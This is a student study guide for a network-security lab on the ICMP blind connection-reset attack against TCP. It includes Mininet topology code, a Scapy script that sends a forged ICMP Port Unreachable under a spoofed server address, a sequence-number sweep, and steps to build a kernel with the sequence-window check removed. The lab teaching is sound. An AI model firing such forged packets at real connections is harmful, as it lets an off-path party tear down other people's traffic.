# Attack 1 Study Guide — ICMP Blind Connection-Reset

This is written so you can read it top to bottom with zero assumed
background, and come out understanding every line of code. Read it in
order the first time.

---

## 1. The idea, in one paragraph

Two computers — **Client** and **Server** — have an ongoing TCP
connection (think: a file download in progress). A third computer, the
**Attacker**, is *not* part of that conversation: it never sees a single
real packet between Client and Server ("off-path" / "blind"). Despite
that, the Attacker can send the Client one forged message that says, in
effect, *"the Server just told me it can't reach you anymore — give up on
this connection."* If the Client's operating system believes it, the
connection dies, even though the Server never said any such thing. That
forged message is what we're building.

---

## 2. Vocabulary (read this before the code — everything below assumes it)

| Term | Meaning |
|---|---|
| **4-tuple** | `(client IP, client port, server IP, server port)`. This is how the OS identifies *which* TCP connection a packet belongs to. To attack a connection you must know (or guess) all four values. |
| **Sequence number (seq)** | TCP numbers every byte it sends with an increasing counter. It's how the receiver knows what order data goes in, and how it detects loss. |
| **SND.UNA / SND.NXT** | The "window" of sequence numbers currently in flight (sent but not yet acknowledged). A patched kernel will only trust an ICMP error if the sequence number inside it falls in this window — because only someone who was actually watching the real traffic could know it. |
| **ICMP** | A side-channel protocol routers/hosts use to report problems ("network unreachable," "port unreachable," etc.), *separate* from your actual TCP/UDP traffic. |
| **ICMP Type 3, Code 3 ("Port Unreachable")** | A "hard error." Historically, TCP stacks reacted to this by immediately aborting the connection. |
| **Spoofing** | Writing a false source address into a packet. Here, the Attacker sets the outer IP source to look like it's the Server, even though it isn't. |
| **Off-path attacker** | Someone who is not sitting on the network path between Client and Server, so cannot sniff their real packets or real sequence numbers. Must guess. |

---

## 3. Why this attack can work at all (the actual vulnerability)

Old TCP stacks trusted ICMP hard errors unconditionally: *"an ICMP Port
Unreachable arrived referencing my connection → kill the connection,"*
with no check that whoever sent the ICMP was telling the truth. Since
ICMP has no authentication, anyone who can guess a connection's 4-tuple
could forge this message from anywhere on the internet.

Modern kernels added **one specific guard**: before honoring the ICMP
error, check that the embedded TCP sequence number falls inside
`[SND.UNA, SND.NXT)` — the connection's real current window. A blind
attacker who never saw real traffic can't know this window precisely, so
in principle they'd need to try many guesses to land inside it.

Your TA's `custom_5.15` kernel **removes exactly that one guard**, so you
can demonstrate the historical, pre-patch behavior on purpose, in a
controlled lab, and contrast it against your normal (patched) kernel
where the same packet is expected to be ignored.

---

## 4. The topology (`topo.py`) — concept first

```
  client (10.0.1.1) ---- r ---- server (10.0.2.1)
                          |
                     attacker (10.0.3.1)
```

Why not just put all three on one flat network? Because then the
Attacker could simply eavesdrop or ARP-spoof and see the real traffic —
that's not a *blind* attack anymore, it's trivial. To honestly model "an
attacker anywhere on the internet," we give each host its **own subnet**
behind a router `r`. The Attacker's packets are only ever forwarded
through `r`, never delivered straight to the Client↔Server link — so it
structurally cannot see that traffic.

Two extra details that make this actually work:

- **`ip_forward=1`** on the router — otherwise it won't pass packets
  between subnets at all, and nothing reaches anyone.
- **`rp_filter=0`** ("reverse path filtering" turned off) on the router
  and the client — this is a Linux anti-spoofing feature that normally
  *drops* a packet if it arrives on an interface that doesn't match the
  route back to its claimed source address. Our attack packet's source
  is spoofed to be the Server, but it physically arrives via the
  Attacker's link — exactly the mismatch `rp_filter` is designed to
  catch. We must disable it, or every forged packet gets silently eaten
  before it ever reaches the TCP/ICMP code we're trying to test.

---

## 5. Code walkthrough: `topo.py`

```python
class LinuxRouter(Node):
    def config(self, **params):
        super().config(**params)
        self.cmd('sysctl -w net.ipv4.ip_forward=1')
        self.cmd('sysctl -w net.ipv4.conf.all.rp_filter=0')
```
A Mininet "Node" that, the moment it's configured, turns itself into an
IP router: forwarding on, anti-spoofing off. This becomes host `r`.

```python
class OffPathTopo(Topo):
    def build(self):
        r = self.addNode('r', cls=LinuxRouter, ip='10.0.1.254/24')
        client   = self.addHost('client',   ip='10.0.1.1/24', defaultRoute='via 10.0.1.254')
        server   = self.addHost('server',   ip='10.0.2.1/24', defaultRoute='via 10.0.2.254')
        attacker = self.addHost('attacker', ip='10.0.3.1/24', defaultRoute='via 10.0.3.254')
```
Declares 4 nodes: the router, and 3 hosts, each on its own `/24` subnet,
each told "send anything not on my own subnet to the router."

```python
        self.addLink(client,   r, intfName2='r-eth1', params2={'ip': '10.0.1.254/24'})
        self.addLink(server,   r, intfName2='r-eth2', params2={'ip': '10.0.2.254/24'})
        self.addLink(attacker, r, intfName2='r-eth3', params2={'ip': '10.0.3.254/24'})
```
Wires a cable (a `veth` pair, virtually) from each host to its own
dedicated interface on the router, and gives the router the "gateway"
address on each subnet.

```python
def run():
    net = Mininet(topo=OffPathTopo(), controller=None)
    net.start()
    for h in ('r', 'client'):
        net[h].cmd('sysctl -w net.ipv4.conf.all.rp_filter=0')
        net[h].cmd('sysctl -w net.ipv4.conf.default.rp_filter=0')
    CLI(net)
    net.stop()
```
Builds and starts the network, belt-and-suspenders re-disables
`rp_filter` (some kernels reset it per-interface as links come up), then
drops you into the interactive `mininet>` prompt. When you type `exit`,
it tears everything down.

---

## 6. Code walkthrough: `attack1_reset.py`

The forged packet has **layers, like an envelope inside an envelope**.
Here's what actually goes on the wire, outside-in:

```
[ real Ethernet frame ]
  [ outer IP header:  src = SERVER (fake!)   dst = CLIENT ]
    [ ICMP header:    type=3 (Dest. Unreachable), code=3 (Port Unreachable) ]
      [ inner IP header: src = CLIENT   dst = SERVER ]
        [ inner TCP header: sport=CLIENT_PORT dport=SERVER_PORT seq=SEQ ]
```

The **outer** layer is "the error message itself," addressed to the
Client, faked to look like it's from the Server. The **inner** layer
(ICMP errors always carry a copy of "the packet that supposedly caused
the problem") is what lets the Client's kernel figure out *which*
connection this error is about — it's a reconstruction of a packet the
Client itself would have sent to the Server.

Now the code, step by step:

```python
CLIENT_IP   = "10.0.1.1"
SERVER_IP   = "10.0.2.1"
CLIENT_PORT = 40000
SERVER_PORT = 5201
SEQ         = 0
```
The **only** 5 values that describe the attack. Change these 5 lines and
nothing else, and the exact same script works in Mininet, VirtualBox, or
on real machines — because everything below only depends on these
values, never on how the network was built.

```python
offending = IP(src=CLIENT_IP, dst=SERVER_IP, proto=6) / \
            TCP(sport=CLIENT_PORT, dport=SERVER_PORT, seq=SEQ)
```
Builds the **inner** fake packet: "here's the TCP segment the Client
supposedly sent to the Server." `proto=6` means "the next header is
TCP." The `/` operator in Scapy means "stack this layer on top of that
one" — so this line means *IP header, then TCP header, glued together*.

```python
spoofed = IP(src=SERVER_IP, dst=CLIENT_IP) / \
          ICMP(type=3, code=3) / \
          offending
```
Wraps that inner packet inside the **outer** ICMP error: IP layer says
"from Server, to Client"; ICMP layer says "Port Unreachable"; and then
the whole `offending` packet from before is attached as the payload —
the "here's what I supposedly couldn't deliver" part.

```python
send(spoofed, verbose=False)
```
Hands the finished packet to the OS to transmit. Scapy looks up
`CLIENT_IP` in the routing table to decide which interface to send it
out of — this is why the same call works regardless of environment: it
always just asks "how do I reach this IP?" and lets the OS answer.

### 6.1 Why one packet isn't enough — the sequence-number sweep

The single-packet version above is enough to *understand the mechanism*,
but it is not yet a faithful "blind" attack. On a stock/patched kernel,
the sequence check doesn't make the attack impossible — only expensive:
a real off-path attacker sprays many guesses, evenly spaced across the
full 32-bit sequence space, so that at least one lands inside the
connection's real window `[SND.UNA, SND.NXT)`. If the spacing between
guesses is no larger than the real window size, a hit is *guaranteed*
(RFC 5927 §5):

```
packets needed  ≈  2^32 / assumed_window_size
```

The current `attack1_reset.py` implements exactly this: instead of one
fixed `SEQ`, it sweeps `ASSUMED_WINDOW`-spaced guesses across the whole
space and fires them all. Setting `ASSUMED_WINDOW = 2**32` collapses it
back to the original single-packet demo (`SEQ=0` only) — useful on the
modified kernel, where the check is skipped entirely and any `SEQ`
works, so guessing is pointless there.

One important consequence: because this defense is *probabilistic, not
absolute*, a wide enough real window (large bandwidth-delay product, as
in our Mininet links) means the sweep can occasionally succeed **even
on your normal, fully patched stock kernel** if a guess happens to land
in-window. That's not a bug — it's the accurate, if slightly
uncomfortable, reality of what this mitigation actually buys you.

---

## 7. Running it

### Option A — one command (recommended)
```bash
cd "/home/anisa/BUET/4-1/CSE406/Cyber Security Project "
./run_attack1.sh
```
This wipes any stale Mininet state, builds the network, starts a real
iperf3 transfer, fires the attack, and prints a verdict — no manual
typing required. (It will ask for your sudo password; Mininet needs root
to create network namespaces/interfaces.)

### Option B — manual, step by step (useful for exploring)
```bash
sudo /usr/bin/python3 topo.py
```
Then at the `mininet>` prompt:
```text
mininet> pingall
mininet> server iperf3 -s -p 5201 &
mininet> client iperf3 -c 10.0.2.1 -p 5201 --cport 40000 -t 600 &
mininet> client ss -tin
mininet> attacker /usr/bin/python3 attack1_reset.py
mininet> client ss -tin
```

> **Why `/usr/bin/python3` and not just `python3`?** If your terminal has
> a Python virtual environment active (yours does — `Demo-NK4XzLb-`),
> plain `python3` points into that venv, which doesn't have Mininet or
> Scapy installed. `sudo` on its own usually resets this, but being
> explicit avoids any confusion. This is *only* relevant to Option B —
> `run_attack1.sh` already handles it for you.

---

## 8. How to tell if it worked

**`ss -t` before vs. after** is your primary signal:
```text
ESTAB  0  655360  10.0.1.1:40000  10.0.2.1:5201
```
- `ESTAB` line **still there**, `bytes_acked`/`cwnd` still climbing →
  connection is alive → **attack failed**.
- `ESTAB` line for port 40000 is **gone** → connection was killed →
  **attack succeeded**.

**But** "still ESTAB" only proves the *kernel* rejected the packet if the
packet actually *arrived*. Otherwise you might just have a plumbing bug
(routing, `rp_filter`) and be drawing the wrong conclusion. That's why
both `run_attack1.sh` and the manual walkthrough sniff ICMP on the client
with `tcpdump` and report a packet count. Read the two signals together:

| ICMP arrived? | Connection survived? | Meaning |
|---|---|---|
| Yes | No | **Attack succeeded** — vulnerable kernel behavior |
| Yes | Yes | **Attack failed, and it's a real result** — kernel's sequence check protected it |
| No  | Yes | **Inconclusive** — packet never arrived; fix routing/`rp_filter` before concluding anything |

---

## 9. Why it failed on your machine just now (and that's correct)

You're running kernel `7.0.0-30-generic` — modern and patched. We sent
`SEQ = 0`, but the real connection's sequence numbers were in the tens of
*billions* (visible in `ss -tin`'s `bytes_sent` field) — nowhere near the
real window. The kernel checked, saw it was out of window, and silently
ignored the forged packet. The connection kept transferring data the
entire time. **This is the exact "defense works" result your report's
Phase 4 asks you to demonstrate** — it's evidence, not a broken script.

To make the attack actually *succeed* for the "before" side of the
comparison, you need the `custom_5.15` kernel, where that check is
removed — see the next section.

---

## 10. Setting up the custom kernel (and safely undoing it)

**Why this is needed:** Mininet hosts are network namespaces, and
namespaces **share the host machine's kernel** — you can't give one
namespace a different kernel than the others. So to demonstrate the
vulnerable (pre-patch) behavior, the *entire machine* has to boot into
the modified kernel. Your normal kernel stays fully installed and
untouched the whole time — you're adding a second bootable kernel
alongside it, not replacing anything. You choose which one boots each
time from the GRUB menu.

**Before you start:** this takes real time (30–90 minutes of compiling)
and real disk space (~20–25 GB free while building). Don't start this
right before a deadline. If you have the two-laptop option your report
mentions, doing this on the spare machine (not your daily driver) removes
any risk entirely.

### 10.1 — Install build dependencies
```bash
sudo apt install -y build-essential libncurses-dev bison flex \
                     libssl-dev libelf-dev dwarves bc git
```

### 10.2 — Get the kernel source
```bash
cd ~   # or wherever you want ~20GB of source to live
git clone --branch custom_5.15 --depth 1 \
    https://github.com/shuaibw/linux.git custom-kernel
cd custom-kernel
```
(`--depth 1` grabs just that branch's latest snapshot, not the whole
kernel's multi-decade history — much faster.)

### 10.3 — Base the config off your current kernel
```bash
cp /boot/config-$(uname -r) .config
make olddefconfig
```
This reuses your current system's kernel configuration (so the custom
kernel supports the same hardware/drivers) and auto-picks sensible
defaults for anything new.

**If Secure Boot is enabled**, a self-compiled unsigned kernel usually
won't boot. Check with:
```bash
mokutil --sb-state
```
If it says "SecureBoot enabled," the simplest fix for a lab machine is to
disable Secure Boot in your BIOS/UEFI settings before installing the new
kernel (re-enable it later if you want — it doesn't affect your normal
kernel either way).

### 10.4 — Build and install
```bash
make -j$(nproc)
sudo make modules_install
sudo make install
sudo update-grub
```
`make install` copies the new kernel into `/boot` and registers it with
GRUB; it does **not** touch your existing `7.0.0-30-generic` kernel.

### 10.5 — Boot into it
```bash
sudo reboot
```
It should boot into the new kernel automatically (newest is usually
default). Confirm with:
```bash
uname -r
```
You should see a version string containing the custom branch's version
(something other than `7.0.0-30-generic`).

### 10.6 — Run Attack 1 again
Same commands as Section 7 — nothing about `topo.py` or
`attack1_reset.py` changes. This time, expect the `ESTAB` line to
**disappear** after the attack.

### 10.7 — Reversing it — back to your normal kernel

**Quick, one-time boot back (no uninstalling anything):**
1. Reboot.
2. At the GRUB menu, hold `Shift` (older BIOS) or press `Esc` repeatedly
   right after power-on (UEFI) to make the menu appear if it's hidden.
3. Choose **"Advanced options for Ubuntu"**, then select your original
   `7.0.0-30-generic` entry.

You're back on your normal kernel immediately — nothing was removed.

**Making your normal kernel the default again (so it boots automatically
without you picking it each time):**
```bash
sudo nano /etc/default/grub
```
Set:
```
GRUB_DEFAULT="Advanced options for Ubuntu>Ubuntu, with Linux 7.0.0-30-generic"
```
(Match the *exact* submenu text — check it by running
`grep -A1 "submenu " /boot/grub/grub.cfg` and
`grep 'menuentry .*generic' /boot/grub/grub.cfg` to see the exact
strings on your machine.) Then:
```bash
sudo update-grub
```

**Fully removing the custom kernel once you're done with the project**
(this one *was* built by hand, so plain `apt remove` won't find it —
you remove the files directly):
```bash
uname -r    # while booted into the CUSTOM kernel, note the exact version string
# reboot into your normal kernel first, then:
sudo rm -rf /lib/modules/<custom-version-string>
sudo rm -f /boot/vmlinuz-<custom-version-string> \
           /boot/initrd.img-<custom-version-string> \
           /boot/System.map-<custom-version-string> \
           /boot/config-<custom-version-string>
sudo update-grub
```

---

## 11. Quick troubleshooting reference

| Symptom | Cause | Fix |
|---|---|---|
| `ModuleNotFoundError: No module named 'mininet'` | Your shell's `python3` points into a virtualenv, not the system Python | Use `/usr/bin/python3`, or run via `sudo` (which usually resets the environment) |
| `pingall` shows dropped packets | Router isn't forwarding, or a link is misconfigured | Re-check `topo.py`'s `ip_forward=1`; re-run `sudo mn -c` then retry |
| ICMP never shows up in the client's `tcpdump` | `rp_filter` still blocking the spoofed source | Confirm `sysctl net.ipv4.conf.all.rp_filter` is `0` on **both** `r` and `client` |
| Mininet won't start / complains about existing nodes | Leftover state from a previous run that crashed | `sudo mn -c` before retrying |
| Attack "fails" on the custom kernel too | `SEQ = 0` may genuinely be out of window even with the check relaxed for other reasons, or you're still booted into the stock kernel | Confirm `uname -r`; try a `SEQ` value read live from `ss -tin`'s sequence info |

---

## 12. References
- RFC 5927 — *ICMP Attacks against TCP* (the core vulnerability class)
- RFC 5681 — *TCP Congestion Control*
- Linux source: `net/ipv4/tcp_ipv4.c` (look for `tcp_v4_err()`), `net/ipv4/icmp.c`
- Reference kernel: https://github.com/shuaibw/linux/tree/custom_5.15
